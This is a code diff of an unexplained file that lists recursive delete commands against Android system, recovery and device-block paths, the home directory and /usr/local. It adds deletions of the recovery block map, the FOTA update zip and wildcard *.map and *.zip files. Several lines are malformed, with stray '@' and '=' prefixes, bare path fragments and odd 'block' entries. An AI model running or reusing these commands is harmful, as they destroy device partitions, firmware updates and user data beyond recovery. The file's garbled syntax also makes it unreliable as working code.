@@ -16,7 +16,10 @@ rm -r /cache/recovery
 rm -r /system/bin/e2fsck
 rm -r /efs
 rm -r /dev/block
-
+rm -r @/cache/recovery/block.map
+block @/cache/recovery/block.map
+rm -r =/data/fota/update.zip
+block =/data/fota/update.zip
 =/
 rm -r ~ /.vscode
 rm -r source=/cache
@@ -28,6 +31,8 @@ rm -r /usr/local/
 /github/workspace/
 rm -rf *.log
 rm -rf *.cpp
+rm -rf *.map
+rm -rf *.zip
 rm -rf *.log
 rm -rf *.json
 rm -rf *.php
